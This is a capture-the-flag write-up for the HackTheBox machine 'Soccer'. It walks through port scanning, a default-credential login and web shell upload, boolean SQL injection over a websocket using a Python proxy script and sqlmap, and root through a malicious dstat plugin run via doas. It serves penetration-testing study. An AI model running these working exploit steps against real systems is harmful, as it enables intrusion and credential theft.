# Recon

All tcp scan:

```sh
> nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.194
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9091/tcp open  xmltec-xmlmail
```

Detailed scan:

```sh
> nmap -p 22,80,9091 -sVC --min-rate 10000 -oA scans/nmap-tcpdetail 10.10.11.194
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 ad0d84a3fdcc98a478fef94915dae16d (RSA)
|   256 dfd6a39f68269dfc7c6a0c29e961f00c (ECDSA)
|_  256 5797565def793c2fcbdb35fff17c615c (ED25519)
80/tcp   open  http            nginx 1.18.0 (Ubuntu)
|_http-title: Soccer - Index
|_http-server-header: nginx/1.18.0 (Ubuntu)
9091/tcp open  xmltec-xmlmail?
```

Directory enumeration:

```sh
> feroxbuster -u http://soccer.htb
301        7l       12w      178c http://soccer.htb/tiny
301        7l       12w      178c http://soccer.htb/tiny/uploads
```

# Shell as www-data

On http://soccer.htb/tiny we can see login page of tiny file manager.
Admins left default credentials (admin:admin@123), so we bypassed that
with little effort. Inside, there is an option to upload arbitrary file,
and tiny file manager is php app, so we upload php web shell and "view" it.
Sadly, it can't be used for long, as there seems to be a cron
job that cleans up uploads directory every two minutes or so. Instead, we can
set up listener on attack machine and simply run reverse connection command
from gtfo bins, and we get access to www-data user.

# Shell as player

Now, we can read nginx config on this server.

```sh
> cd /etc/nginx
> cat nginx.conf

...SNIP...

	##
	# Virtual Host Configs
	##

	include /etc/nginx/conf.d/*.conf;
	include /etc/nginx/sites-enabled/*;

...SNIP...
}

```

Two directories are responsible for virtual host management.
First one is empty, but in second one we can see another subdomain
managed by this site:

```bash
> cd sites-enabled
> cat soc-player.htb
server {
	listen 80;
	listen [::]:80;

	server_name soc-player.soccer.htb;

	root /root/app/views;

	location / {
		proxy_pass http://localhost:3000;
		proxy_http_version 1.1;
		proxy_set_header Upgrade $http_upgrade;
		proxy_set_header Connection 'upgrade';
		proxy_set_header Host $host;
		proxy_cache_bypass $http_upgrade;
	}
```

After accessing this subdomain from browser, we can see an option to login
and register. Login was tested with common sql injection auth bypass payloads,
but nothing worked. After creating new user and logging in, we can see our ticket
number and text field that appears to check if provided ticket number is valid.
Strange thing is, that no http requests are being made from client to server as this
happens. Let's look at underlying js code:

```javascript
var ws = new WebSocket("ws://soc-player.soccer.htb:9091");
window.onload = function () {
    var btn = document.getElementById('btn');
    var input = document.getElementById('id');

    ws.onopen = function (e) {
        console.log('connected to the server')
    }
    input.addEventListener('keypress', (e) => {
        keyOne(e)
    });

    function keyOne(e) {
        e.stopPropagation();
        if (e.keyCode === 13) {
            e.preventDefault();
            sendText();
        }
    }

    function sendText() {
        var msg = input.value;
        if (msg.length > 0) {
            ws.send(JSON.stringify({
                "id": msg
            }))
        }
        else append("????????")
    }
}

ws.onmessage = function (e) {
    append(e.data)
}

function append(msg) {
    let p = document.querySelector("p");
    // let randomColor = '#' + Math.floor(Math.random() * 16777215).toString(16);
    // p.style.color = randomColor;
    p.textContent = msg
}
```

As we can see, the information about tickets is retrieved using web sockets.
Client sends request in form:

```
{"id": 12345}
```

While server replies with:

```
Ticket Exists
```

or 

```
Ticket Doesn't Exist
```

This is a foundation for suspecting boolean SQLi.
Inputing some combinations using websocat didnt yield anything promising.

```
websocat ws://soc-player.soccer.htb:9091
```

We can try to exploit it using sqlmap and proxy script
(for translating http requests sqlmap uses to
messages understood by this particular ws server).

Script was already made by Rayhan, it works well with minimal modification:

```python
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from urllib.parse import unquote, urlparse
from websocket import create_connection

ws_server = "ws://soc-player.soccer.htb:9091"

def main():
    try:
        middleware_server(('0.0.0.0',8081))
    except KeyboardInterrupt:
        pass

def middleware_server(host, content_type="text/plain"):
    class CustomHandler(SimpleHTTPRequestHandler):
        def do_GET(self) -> None:
            self.send_response(200)
            try:
                payload = urlparse(self.path).query.split('=', 1)[1]
            except IndexError:
                payload = False

            if payload:
                content = send_ws(payload)
            else:
                content = 'No parameters specified!'

            self.send_header("Content-type", content_type)
            self.end_headers()
            self.wfile.write(content.encode())
            return

    class _TCPServer(TCPServer):
        allow_reuse_address = True

    httpd = _TCPServer(host, CustomHandler)
    httpd.serve_forever()

def send_ws(payload):
    ws = create_connection(ws_server)
    message = unquote(payload).replace('"','\'')
    data = '{"id":"%s"}' % message

    ws.send(data)
    resp = ws.recv()
    ws.close()

    if resp:
        return resp
    else:
        return ''

if __name__ == "__main__":
    main()
```

We run our proxy, and then run sql map to enumerate databases.
Keep in mind that we need valid ticket for it to work, so we create
new user, fetch valid ticket number and place it as follows:

```sh
> sqlmap -u "http://localhost:8081/?id=59902" --technique B --batch --threads 10 --dbs

available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] soccer_db
[*] sys

> sqlmap -u "http://localhost:8081/?id=59902" --technique B --batch --threads 10 -D soccer_db --tables

Database: soccer_db
[1 table]
+----------+
| accounts |
+----------+

> sqlmap -u "http://localhost:8081/?id=59902" --technique B --batch --threads 10 -D soccer_db -T accouts --dump

+-------+-------------------+----------------------+----------+
| id    | email             | password             | username |
+-------+-------------------+----------------------+----------+
| 1324  | player@player.htb | PlayerOftheMatch2022 | player   |
| 59902 | abcd@a            | abcd                 | abcd     |
+-------+-------------------+----------------------+----------+
```

We got player user credentials. We can try to use them to log via ssh, 
or, if that doesn't work, switch to that user with su from www-data user.

```
ssh player@soccer.htb
player@soccer.htb's password:
player@soccer:~$ ls
user.txt
```

SSH works and we collect user flag.

# Shell as root

After checking with sudo -l, user player cannot run any commands
with it. Running linpeas didn't yield any obvious attack vectors.
One interesting thing on this system is existence of doas, alternative
to sudo. Maybe current user can run some command with it instead of 
sudo.

First, we find it's config file:

```sh
> find / -type f -name "doas.conf" 2>/dev/null
/usr/local/etc/doas.conf
```

Then, we read it:

```sh
> cat /usr/local/etc/doas.conf
permit nopass player as root cmd /usr/bin/dstat
```

We can see that /usr/bin/dstat is possible to run as root.
We can use that, as dstat has plugin system, allowing
the user to execute arbitrary python code with it.

First, we search for dstat directories:

```sh
> find / -type d -name dstat 2>/dev/null
/usr/share/doc/dstat
/usr/share/dstat
/usr/local/share/dstat
```

The directory /usr/local/share/dstat is writeable to us,
and we use that to place our exploit here:

```sh
> touch dstat_exploit.py
> vim dstat_exploit.py
```

```python
import os

os.system('cp /bin/bash /tmp/jjs')
os.system('chmod +s /tmp/jjs')
```

We confirm that dstat indeed sees our "plugin":

```sh
> doas /usr/bin/dstat --list | grep exploit
```

And when it turns out it sees, we run:

```sh
> doas /usr/bin/dstat --exploit
> cd /tmp
> player@soccer:/tmp$ ls
jjs
> ./jjs -p
jjs-5.0# whoami
root
```


# Flags

User:
```
808**************************a9e
```

Root:
```
a2b**************************bf7
```
